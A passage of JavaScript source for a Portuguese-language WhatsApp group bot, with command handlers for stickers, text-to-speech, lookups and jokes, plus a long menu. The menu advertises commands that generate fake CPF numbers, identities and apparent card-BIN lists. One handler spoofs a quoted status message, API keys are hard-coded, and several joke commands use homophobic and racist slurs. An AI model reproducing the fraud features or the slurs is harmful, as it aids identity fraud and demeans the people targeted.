if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
tomioka.sendMessage(from, dador, sticker, {quoted: msg})
break
case 'gerarnick': 
if (!isPremium) return enviar ('só premium')
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
teks = body.slice(10)
send = await fetchJson(`http://brizas-api.herokuapp.com/gerador/fancytext?apikey=brizaloka&text=${teks}`)
teks = ` 🧙🏻‍♂️NICKS GERADOS COM SUCESSO!🧙🏻‍♂️
🍙Primeiro ${send.random_1} 
🍙Segundo ${send.random_2} 
🍙Térceiro ${send.random_3} 
??Quarto ${send.random_4} 
🍙Quinto ${send.random_5}

👾EXTRAS👾
👾${send.squares}
👾${send.inverted_squares}
👾${send.italic}
??${send.bold}
👾${send.future_alien}
👾${send.asian_1}
👾${send.asian_2}
👾${send.squiggle}
👾${send.squiggle_2}
👾${send.squiggle_3}
👾${send.squiggle_4}
👾${send.neon}


➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍

©ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
`
tomioka.sendMessage(from, teks, text, {quoted: msg})
break
case 'button':


    sendButLocation(from, `${prefix}teste`, `sss`, {jpegThumbnail:img}, [{buttonId:``,buttonText:{displayText:'bem vindo😊'},type:1}])

break      
case 'getpic':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)    
if (args.length < 1) return 

if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('Pronto chefe')

mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]

try {

pp = await tomioka.getProfilePicture(mentioned)

buffer = await getBuffer(pp)



//					tomioka.sendMessage(from, buffer, image, {quoted: msg, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)

} catch (e) {

//					await tomioka.sendMessage(from, buffer, image, {quoted: msg, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)

}



break
case 'tts': 
if (!isGroup) return enviar (`[❗] *Olá ${pushname} para poder usar os comandos do bot entre nesse grupo:*\n\n➻ *GRUPO 1* = ${grupo1}`)
if (args.length < 1) return tomioka.sendMessage(from, 'O Código de idioma e obrigatório!!', text, {quoted: msg})					 
if (args.length < 2) return tomioka.sendMessage(from, 'Cadê o texto?', text, {quoted: msg})
dtt = body.slice(8)
const gtts = require('./lib/gtts')(args[0])
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 500
? enviar('O texto e muito grande!!!')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
if (err) return enviar ('ERROR')
tomioka.sendMessage(from, buffer, audio, {ptt:true, quoted:msg})
fs.unlinkSync(rano)
})
})
break
//roubar fig linux
case 'roubar':        
case 'rename':
if (!isPremium) return enviar ('só premium')

txt = args.join(' ')
pack = txt.split('/')[0]
autor = txt.split('/')[1]
fig_mencionada = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
fig_salvar = await tomioka.downloadMediaMessage(fig_mencionada)
fs.writeFileSync('./tomioka.webp', fig_salvar)
const figenviar = await createSticker('./tomioka.webp', {type: 'full', pack: `${pack}`, author: `${autor}`, categories: ['🌹']})
tomioka.sendMessage(from, figenviar, sticker)
break
/*case 'roubar':
case 'rename':
if (!isPremium) return enviar ('só premium')
if (!isQuotedSticker) return enviar ('Apenas figurinha mano')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `YT`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `TioTomioka`
require('./lib/fetcher.js').createStickerExif(satu, dua)
require('./lib/fetcher.js').modStick(media, tomioka, msg, from)
break*/
case 'pucep':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar ('Cad� O Cep')
cep = body.slice(6)
send = await fetchJson(`http://brizas-api.herokuapp.com/consulta/cep?apikey=brizaloka&cep=${cep}`) //http://brizas-api.herokuapp.com/consulta/cep?apikey=ObitoSpam&cep=${cep}
teks = `
        
CEP ${send.resultado.cep} 
RUA ${send.resultado.logradouro}  
BAIRRO ${send.resultado.bairro} 
Cidade ${send.resultado.localidade} 
Estado ${send.resultado.uf}  
DDD ${send.resultado.ddd}   

 `
tomioka.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('kk/sticker/botlogo.webp')}}}})
break
case 'wikipedia':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
teks = body.slice(11)
send = await fetchJson(`https://api-exteam.herokuapp.com/api/info/wikipedia?search=${teks}&apikey=pip`)
teks = ` ${send.result.result}`
tomioka.sendMessage(from, teks, text, {quoted: msg})
break/*
//github
case 'gitdobot':
case 'git':  
tomioka   

texto = `
O INDEX ESTÁ CRIPTOGRAFADO, MAS DÁ PARA ALTERAR IMAGENS, VIDEOS E ÁUDIOS.

QUISER O INDEX DESCRIPTOGRAFADO, SÓ NEGOCIANDO COM O DONO. 

INSTALAÇÃO TERMUX OS PACOTES, SÓ SERÁ NESCESSÁRIO UTILIZAR 1 VEZ, APÓS O TERMUX INSTALADO.

(LEMBRANDO, TERMUX DA PLAY STORE NÃO PRESTA, ENTÃO SE TIVER COM O DA PLAY STORE, VAI TER MUITOS ERROS) 

(ALGUMAS DAS VEZES, SERÁ NESCESSÁRIO DA ENTER, QUANDO APARECER [DEFAULT=N?]
E SE APARECER Y/N, EM ALGUM DELES, APENAS DIGITE Y E DE ENTER.)


pkg upgrade -y

pkg update -y

pkg install git -y

pkg install nodejs -y

pkg install nodejs-lts -y

termux-setup-storage

-------------≠≠≠=≠----------------------

INSTALAÇÃO DOS COMANDOS DO BOT.

(COLE UM COMANDO POR 1 !!)

cd /sdcard

git clone https://github.com/GyuuTomioka/TOMIOKABOT

cd TOMIOKABOT

bash install.sh 

npm start

(SDCARD É O ARMAZENAMENTO INTERNO DO SEU CELULAR, ENTÃO A PASTA DO BOT TEM QUE ESTÁ LÁ, CASO QUEIRA ALTERAR ALGO, ALTERE LÁ)

===≠≠≠==========================
Lembrando:
Todo aplicativo que instalamos, ele vem com otimização de bateria, e isso faz o aplicativo fechar após sair dele, ou ele parar de funcionar, ou até deixa o aplicativo muito lento, então pra desativar é o seguinte.
Vá em configurações do celular, aplicativos, procure o termux, clique, clique em bateria, vai ter um nome "otimizando a bateria" clique, la encima vai ter um nome "Aplicat. não otimizados" clique, e escolha todos, e procure o termux pesquisando o nome, ou manual, e desative se estiver ativado a otimização, desative do whatsapp também.

=====≠≠========================
para ligar:

cd /sdcard/TOMIOKABOT

npm start
===============================

Se quiser alterar o video do menu, fica na pasta assets, chamado vidmenu.mp4, só colocar outro no mesmo lugar com o mesmo nome e substituir.

===≠≠=============≠≠==========

Para gerar outro qrcode, você precisa apagar o arquivo BarBar.json, que fica dentro da pasta do bot, depois ligar normalmente.

=======≠≠≠===========≠≠========

Meu Canal: https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ

===============================

ACODE DOWNLOAD:
https://www.mediafire.com/download/39o3dijk4tqyk2f

======≠≠================≠≠======

TERMUX "VERSÃO 117"
PRA ANDROID 7 PRA CIMA: https://www.mediafire.com/download/plyu1fbkc9hpss4

=====≠≠===========≠≠============

ZARCHIVER PRO:
https://www.mediafire.com/download/1zoqguo9x5zkapx

=====≠≠========≠≠===============
`
tomioka.sendMessage(from, texto, text, {contextInfo: null})
break*/
//_ATTPs	
case 'ttp': //BY SAYO

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)         
if (!isPremium) return enviar ('só premium')     
if (args.length < 1) return enviar (`cadê o texto mano?\nexemplo ${prefix + command} ${pushname}`)

const cor = ["f702ff","ff0202","00ff2e","efff00","00ecff","3100ff","ffb400","ff00b0","00ff95","efff00"] //CORES COLOQUE QUALQUER UMA MAS EM CODE

const fonte = ["Days%20One","Domine","Exo","Fredoka%20One","Gentium%20Basic","Gloria%20Hallelujah","Great%20Vibes","Orbitron","PT%20Serif","Pacifico"]//FONTS NÃO MEXA

sayo = cor[Math.floor(Math.random() * (cor.length))]	 				 

sayo2 = fonte[Math.floor(Math.random() * (fonte.length))]	 		

sayo = `https://huratera.sirv.com/PicsArt_08-01-10.00.42.png?profile=Example-Text&text.0.text=${encodeUrl(body.slice(5))}&text.0.outline.color=000000&text.0.outline.blur=0&text.0.outline.opacity=55&text.0.color=${sayo}&text.0.font.family=${sayo2}&text.0.background.color=ff0000`               

sendStickerFromUrl(from, sayo, {quoted: tomio, contextInfo: tome})



break

case 'attp':
if (!isPremium) return enviar ('só premium')
if (args.length < 0) return enviar('Cadê o texto, hum?')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
var txt = encodeURI(body.slice(6))
anu = await getBuffer(`https://api.xteam.xyz/attp?file&text=${txt}`)
tomioka.sendMessage( from, anu, sticker, {contextInfo:tome})
break	
case 'attp1':	
if (!isPremium) return enviar ('só premium')	
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp1?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	     
case 'attp2':	
if (!isPremium) return enviar ('só premium')	
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp2?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp3': 	
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp3?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp4': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp4?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp5':	
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp5?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break
case 'attp6':		
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp6?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break
case 'cc':
case 'caracoroa':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const cara = fs.readFileSync('./database/cara/cara.webp');
const coroa = fs.readFileSync('./database/cara/coroa.webp');
cararo = ["cara", "coroa"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
enviar(`você conseguiu: ${fej}`)
cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
tomioka.sendMessage(from, cararoa, sticker, {quoted: msg})
break
case 'sn':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const sn = ['sim', 'não']
gosto = body.slice(3)
if (args.length < 1) return tomioka.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O Tomioka  é um baiano preguiçoso?`, text, {quoted: msg})
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`
enviar(hasil)
break
case 'gadometro':
case 'gado':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Você é:\n\n${gado}`
enviar(hisil) 
break
case 'viadometro':
case 'viado':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
var chifre = ["ultra extreme viado", "viado-Master", "viado-Rei", "viado", "viado-ceta", "viado-ceta Maximo", "viadao???", "mestredos viados<3", "Mestre Do viados em pessoa<3<3", "viado-Manso", "viado-Conformado", "viado-Incubado", "viado Deus", "Mestre dos viados", "Topa tudo por buceta", "viado Comum", "Mini viadinho", "viado Iniciante", "viado Basico", "viado Intermediario", "viado Avançado", "viado Profisional", "viado Mestre", "viado Chifrudo", "viado Conformado", "viado HiperViadão", "viadão Deus", "Mestre dos viadões"]
var viado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Você é:\n\n${viado}`
enviar(hisil) 
break

case 'abraço':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
yhb = `Que fofo... @${sender.split("@")[0]} deu um abraço apertado em @${mentioned[0].split('@')[0]}`
mentions(yhb, yhb, true)
break
case 'contar':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length == 0) return enviar ( '0 caracteres, pois obviamente não há texto😀')
const count = body.slice(8).length
if (count === 1) {
enviar(`O texto possui ${count} caractere.`)
} else if (count > 1) {
enviar(`O texto possui ${count} caracteres.`)
}
break
case 'membrocm':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, membrocm(prefix, sender), text, {quoted: msg})
break
case 'utils':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, utils(prefix, sender), text, {quoted: msg})
break
case 'imunes':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/imunes.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: imunes(prefix, sender), thumbnail: fs.readFileSync('./assets/imunes.jpg')})
break
case 'metodos':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, metodos(prefix, sender), text, {quoted: msg})
break
/*  case 'compras':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, compras(prefix, sender), text, {quoted: msg})
break*/
case 'pack18':

if (!isPremium) return enviar ('só premium')
tomioka.sendMessage(from, pack18(prefix, sender), text, {quoted: msg})
break
/*case 'semoji': //cry-bot
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if (args.length == 0) return enviar(`Usage: ${prefix + command} query\nExample: ${prefix + command} 😭`)
emoji = args[0]
try {
emoji = encodeURI(emoji[0])
} catch {
emoji = encodeURI(emoji)
}
anu = await fetchJson(`https://api-gdr2.herokuapp.com/api/emoji2png?text=${emoji}`)
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, { quoted: tomio, contextInfo: tome })
break*/
case 'emoji':
if (!isPremium) return enviar ('só premium')
if (!q) return enviar('e o emoji?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
const emojitext = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${emojitext}`) 
console.log(emojitext)
})
break
case 'emoji2':
if (!isPremium) return enviar ('só premium')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if (args.length == 0) return enviar(`Usage: ${prefix + command} query\nExample: ${prefix + command} 😭`)
emoji = args[0]
try {
emoji = encodeURI(emoji[0])
} catch {
emoji = encodeURI(emoji)
}
buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=6b25e69d0ba3dc9447010464`)
tomioka.sendMessage(from, buffer, sticker, { quoted: tomio, contextInfo: tome })
break
case 'grupo':
    enviar('https://chat.whatsapp.com/DBgLXf5IqUrAN4NKg9gURc')
//_ MENU PRINCIPAL
case 'menu':
const tempo = speed();
const latencia = speed() - tempo
run = process.uptime() 
teks = `${kyun(run)}`
const menu = `
🎉NOVIDADES🎉
𖣔➣❧${prefix}sn (sua pergunta)
✔Utilidade－responder com sim ou não 

𖣔➣❧${prefix}efeitos
✔Utilidade－mostra o menu de efeitos para audio 

𖣔➣❧${prefix}wikipedia (sua pesquisa)
✔Utilidade－pesquisa no wiki pra vc 

𖣔➣❧${prefix}wame  
✔Utilidade－faz um link do seu numero :) 

𖣔➣❧${prefix}chance 
✔Utilidade－diz a chance do que vc disser 

𖣔➣❧${prefix}tomp3 (comente o video) 
✔Utilidade－video pra audio 

𖣔➣❧${prefix}covidglobal
✔Utilidade－mostra numeor de casos global 

𖣔➣❧${prefix}reversevid (comente o video)  
✔Utilidade－rever te o video 

𖣔➣❧${prefix}google (sua pesquisa) 
✔Utilidade－pesquisa no google 

𖣔➣❧${prefix}getpic (mensione a pessoa)
✔Utilidade－pega a foto da pessoa como se fosse localização 

𖣔➣❧${prefix}covid19
✔Utilidade－informações do covid no Brasil 

𖣔➣❧${prefix}ytsrc (nome da musica)
✔Utilidade－ve todas as musicas relacionadas e baixa pra ti 

Menu de grupo
𖣔➣❧${prefix}bemvindo [OFF]
✓Utilidade-ativa o modo de boas vindas 

𖣔➣❧${prefix}antilink [1/0] [ON]
✓Utilidade-ativa antilink em geral (wa.me,https://) 

------------------ANTI TRAVA------------------
𖣔➣❧${prefix}antispam [1/0] 
✓Utilidade-todos os testox que tiver minimo 3500 palavras 
o bot banirá (travas) e mandara destrava ainda 

𖣔➣❧${prefix}antidoc [1/0]
✓Utilidade-ativa anti documento 

𖣔➣❧${prefix}anticontato [1/0]
✓Utilidade-nao pode mandar contato e nem vcard 

𖣔➣❧${prefix}anticontato [1/0]
✓Utilidade-ativa anti localização (a pessoa nao pode mandar localização)
------------------ANTI TRAVA------------------
𖣔➣❧${prefix}leveis [1/0]
✓Utilidade-ativa level no grupo pra ver quem
conversa mais e vai subindo de nivel 

𖣔➣❧${prefix}antifake [1/0]
✓Utilidade-altera a descrição do grupo 

𖣔➣❧${prefix}simih [1/0]
✓Utilidade-ativa respostas automaticas no grupo 

𖣔➣❧${prefix}vote @marque | motivo | 1 (1 = 1 Minuto)
✓Utilidade-abre uma votação pro grupo 

𖣔➣❧${prefix}amongus @mensione
✓Utilidade-bane a pessoa igual o among us (jogo) 

𖣔➣❧${prefix}abrir
✓Utilidade-abre o grupo (para todos) 

𖣔➣❧${prefix}fechar
✓Utilidade-fecha o grupo (só para admins) 

𖣔➣❧${prefix}promover [comente]
✓Utilidade-da adm para a pessoa 

𖣔➣❧${prefix}rebaixar [comente]
✓Utilidade-tira adm da pessoa 

𖣔➣❧${prefix}setdesc
✓Utilidade-altera a descrição do grupo 

𖣔➣❧${prefix}setfoto
✓Utilidade-altera a imagem do grupo 

𖣔➣❧${prefix}setnome (nome do grupo a ser mudado)
✓Utilidade-altera o nome do grupo 

𖣔➣❧*${prefix}linkgp
✓Utilidade-manda o link do grupo 

𖣔➣❧${prefix}banir [@]
✓Utilidade-bane a pessoa que marcar 

𖣔➣❧${prefix}add
✓Utilidade-add a pessoa automatico (se nao ir é pq ela privou) 

𖣔➣❧${prefix}admins
✓Utilidade-lista os adms do grupo 

𖣔➣❧${prefix}marcar
𖣔➣❧${prefix}marcar2
𖣔➣❧${prefix}marcar3 

𖣔➣❧*${prefix}online
✓Utilidade-lista as pessoas online 

𖣔➣❧${prefix}kik (comente a mensagem)
✓Utilidade-bani ela do gp 

𖣔➣❧${prefix}bloqueados
✓Utilidade-lista todos os numeros que o bot bloqueou!
❗violaram as regras❗ 

𖣔➣❧${prefix}dono
✓Utilidade-manda o contato do dono do bot 

𖣔➣❧${prefix}grupoinfo
✓Utilidade-mostra informações do grupo 

𖣔➣❧${prefix}perfil
✓Utilidade-diz o seu perfil 

-ツcomente a imagemツ-
𖣔➣❧${prefix}hitler [OFF]
𖣔➣❧${prefix}trash
𖣔➣❧${prefix}trash2 [OFF]
𖣔➣❧${prefix}morto [OFF]
𖣔➣❧${prefix}joke [OFF]
𖣔➣❧${prefix}animerosto [OFF]
𖣔➣❧${prefix}quadro [OFF]
𖣔➣❧${prefix}afetar [OFF] 

-ツANIMEツ-
𖣔➣❧${prefix}loli
𖣔➣❧${prefix}neko [OFF]
𖣔➣❧${prefix}hentai [OFF]


-ツ funções premium ツ- 

❗para ter acesso premium mande o comando ${prefix}comprar 

𖣔➣❧${prefix}dado
✓Utilidade-fala numero aleatório de 1 a 6 

𖣔➣❧${prefix}premiumlist
✓Utilidade-ostra a lista de usuarios premium 

𖣔➣❧${prefix}delete (marque a mensagem do bot)
✓Utilidade-bot deleta a mensagem que marcar 

𖣔➣❧${prefix}mediafire (link)
✓Utilidade－baixa o arquivo do mediafire 

𖣔➣❧${prefix}playe (nome da musica)
✓Utilidade－baixa o video do yt em mp3 

𖣔➣❧${prefix}play8 (nome da musica)
✔Utilidade－baixa em .mp3 pra vc e faz um link de download
📌comando as vezes cai ent tem que mandar dnv outra hora 

𖣔➣❧${prefix}img (nome da imagem)
✔Utilidade－manda foto da imagem que especificou 

𖣔➣❧${prefix}buscar (nome da musica)
✓Utilidade－busca a musica e baixa em audio ou video (vc escolhe) 

𖣔➣❧${prefix}figutag (marque a fig)
✓Utilidade－marca todo mundo com figurinha 

𖣔➣❧${prefix}supertag (marque a foto/video)
✓Utilidade－marca todo mundo com foto/video 

𖣔➣❧${prefix}tourl
✓Utilidade-transforma imagem em link 

𖣔➣❧${prefix}tolink
✓Utilidade-transforma video em link 

𖣔➣❧${prefix}rename (nome que quer ponhar)
✓Utilidade－renomeia a figurinha que selecionar 

𖣔➣❧${prefix}ttp (texto) faz fig do texto com cores aleatórias
𖣔➣❧${prefix}attp
✓Utilidade－figurinha de texto piscando ex －attp 123
𖣔➣❧${prefix}attp1
𖣔➣❧${prefix}attp2
𖣔➣❧${prefix}attp3   (esses outros attps é pra mudar a fonte)
𖣔➣❧${prefix}attp4
𖣔➣❧${prefix}attp5
𖣔➣❧${prefix}attp6 

𖣔➣❧${prefix}qrcode (link)
✓Utilidade-gera qr code do link 

𖣔➣❧${prefix}chentai (+18)
✓Utilidade-o pack mais completo de hentai 

𖣔➣❧${prefix}gcpf
✓Utilidade-gera lista de cpf 

𖣔➣❧${prefix}ddd (ddd)
✓Utilidade-manda as cidade que o ddd se encontra e a regiao 

𖣔➣❧${prefix}gbin
✓Utilidade-gera lista do Aliexpress 

𖣔➣❧${prefix}pack18 (+18)
✓Utilidade-manda pack +18 

𖣔➣❧${prefix}destrava
✓Utilidade-manda destrava (zap) 

𖣔➣❧${prefix}gpessoa
✓Utilidade-gera pessoas cpf, rg .. 

𖣔➣❧${prefix}pmake (nome/nick) [+18]
✓Utilidade-faz plaquinha de um geitin 

𖣔➣❧${prefix}pmake2 (nome/nick) [+18]
✓Utilidade-faz plaquinha de outro geitin
𝕃𝕆𝔾𝕆𝕊 ℙℝ𝔼𝕄𝕀𝕌𝕄 [OFF] 

シ-ESPECIFICO DO BOT-シ 

𖣔➣❧${prefix}ping
✓Utilidade-manda o a velocidade do bot 

𖣔➣❧${prefix}rr
✓Utilidade-brincadeira do bot :) 

𖣔➣❧${prefix}cc
✓Utilidade-joga cara ou coroa 

𖣔➣❧${prefix}contar (seu texto)
✓Utilidade-diz quantos caracteres o texto possui 

𖣔➣❧${prefix}map (nome)
✓Utilidade-mostra a cidade, pais, regiao..etc (em foto) 

𖣔➣❧${prefix}wait [na legenda] 
✓Utilidade-pega um anime com base na foto 

-ツOUTROS ツ-
𖣔➣❧${prefix}testtime
✓Utilidade-conta 10 segundos pra vc 

𖣔➣❧${prefix}cringe [OFF]
✓Utilidade-memes aleatórios 

𖣔➣❧${prefix}next
✓Utilidade-é fofo veja ツ 

𖣔➣❧${prefix}alerta
✓Utilidade-manda memes cringe 

𖣔➣❧${prefix}gerarnick
✓Utilidade-gera nick pra tu 

𖣔➣❧${prefix}abraço 
✓Utilidade-marque alguem para abraça-lo 

𖣔➣❧${prefix}membrocm 
✓Utilidade-desenho not bad 

𖣔➣❧${prefix}compras 
✓Utilidade-caso queira comprar o bot 

𖣔➣❧${prefix}utila 
✓Utilidade-varios packs de tudo 

𖣔➣❧${prefix}imunes 
✓Utilidade-varios imunes pra ti :) 

𖣔➣❧${prefix}death 
✓Utilidade-mostra com quantos anos vc vai morrer 

𖣔➣❧${prefix}modapk
✓Utilidade- manda pack de aps mods 

𖣔➣❧${prefix}githubstalk (nome de usuario)
✓Utilidade- busca usuario no git hub 

𖣔➣❧${prefix}simi (converse)
✓Utilidade- ele responde sua mensagem com
uma pré definida 

-ツMENU  RANKS/INTERAÇÃOツ-
📌${prefix}rankes ➤menu de botao*📌 

𖣔➣❧${prefix}ranklindos 
✓Utilidade-marca as 5 pessoas mais lindas🤩 do grupo 

𖣔➣❧${prefix}rankalfa 
✓Utilidade-marca as 4 pessoas alfas🐺 do grupo 

𖣔➣❧${prefix}rankfeios
✓Utilidade-marca as 5 pessoas mais feias🤢 do grupo 

𖣔➣❧${prefix}rankcaco
✓Utilidade-marca os 5 mamacos🐒 do grupo 

𖣔➣❧${prefix}rankloucos
✓Utilidade-marca os 5 loucos🤡 do grupo 

𖣔➣❧${prefix}rankgay
✓Utilidade-marca as 5 pessoas gays🏳️‍🌈 do grupo 

𖣔➣❧${prefix}rankiludidos
✓Utilidade-marca as 5 pessoas iludidas🌝 do grupo 

𖣔➣❧${prefix}suruba
✓Utilidade-marca as 5 pessoas para uma surubinha no grupo 

𖣔➣❧${prefix}surubao
✓Utilidade-marca as 5 pessoas para um surubão no grupo 

𖣔➣❧${prefix}gostosas
✓Utilidade-marca as 5 pessoas mais gostosas🥰 do grupo 

𖣔➣❧${prefix}rankprincipes
✓Utilidade-marca os 5 principes do grupo🤴🏻 do grupo 

𖣔➣❧${prefix}rankprincesas
✓Utilidade-marca as 5 princesas👸🏻 do grupo 

𖣔➣❧${prefix}ranknazista
✓Utilidade-marca os 5 nazistas 💂‍♂️ do grupo 

𖣔➣❧${prefix}rankbeta
✓Utilidade-marca os 5 betas 🤓 do grupo 

𖣔➣❧${prefix}rankgado
✓Utilidade-marca os 5 gados 🐃 do grupo 

𖣔➣❧${prefix}casal
✓Utilidade-shippa duas pessoas ❤️🙃 

𖣔➣❧${prefix}abraço (marque a pessoa que quer dar o abraço)
✓Utilidade-marca os dois com uma mensagem fofinha 

𖣔➣❧${prefix}gadometro
✓Utilidade-diz que tipo de gado vc é 

𖣔➣❧${prefix}%feio
✓Utilidade-diz sua % de feio 

𖣔➣❧${prefix}%bonito
✓Utilidade-diz sua % de bonito 

𖣔➣❧${prefix}gay
